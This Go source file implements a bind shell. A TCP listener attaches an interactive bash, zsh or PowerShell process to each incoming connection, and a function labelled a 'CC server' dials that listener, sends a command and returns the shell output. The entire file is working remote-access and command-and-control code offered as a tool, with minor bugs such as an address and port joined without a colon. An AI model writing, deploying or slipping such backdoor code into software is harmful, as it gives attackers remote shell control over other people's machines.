package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
)

// handle incoming connections
func handleBindConnection(conn net.Conn) {

	// log new connection
	log.Printf("Received connection from %v\n", conn.RemoteAddr().String())

	// determine local operating system
	os := runtime.GOOS

	// test connection by sending confirmation
	// note: data needs to be converted to []byte before being sent
	_, err := conn.Write([]byte(fmt.Sprintf("Successfully connected to client running %s\n", os)))
	if err != nil {
		log.Println("An error occured while trying to write to the connection:", err)
	}

	// make sure connection is closed when process finishes
	defer conn.Close()

	// start local shell depending on local operating system
	shell := exec.Command("/bin/bash")
	switch os {
	case "windows":
		shell = exec.Command("powershell.exe")
	case "linux":
		shell = exec.Command("/bin/bash")
	case "darwin":
		shell = exec.Command("/bin/zsh")
	}

	// connect shell to server
	shell.Stdin = conn
	shell.Stdout = conn
	shell.Stderr = conn
	shell.Run()
}

func bindShellHost(listenPort string) {

	// start a tcp listener on the specified port
	listener, err := net.Listen("tcp", "localhost:"+listenPort)
	if err != nil {
		log.Printf("An error occurred while initializing the listener on %v: %v\n", listenPort, err)
	} else {
		log.Println("Listening on tcp port " + listenPort + "...")
	}

	// infinite loop waiting for connections and handing them to the handler function
	for {
		connection, err := listener.Accept()
		if err != nil {
			log.Printf("An error occurred during an attempted connection: %v\n", err)
		}
		// concurrently handle all incoming connections
		go handleBindConnection(connection)
	}
}

// example of CC server that sends a user defined command to remote shell and returns the output
func bindShellCC(remoteAddr string, remotePort string, cmd string) []byte {

	// connect to the listener on the remote machine
	conn, err := net.Dial("tcp", remoteAddr+remotePort)
	if err != nil {
		log.Println("An error occurred while connecting to remote host:", err)
		os.Exit(1)
	} else {
		log.Println("Successfully connected to remote host")
	}

	// make sure connection is closed when process finishes
	defer conn.Close()

	// send command to remote host
	_, err = conn.Write([]byte(cmd + "\n"))
	if err != nil {
		log.Println("An error occurred while writing to the remote host connection:", err)
		os.Exit(2)
	}

	// read and return output (stdout, stderr) from remote shell
	buf := make([]byte, 1024)
	_, err = conn.Read(buf)
	if err != nil {
		log.Println("An error occurred while reading from the remote host connection:", err)
		os.Exit(3)
	}

	return buf
}
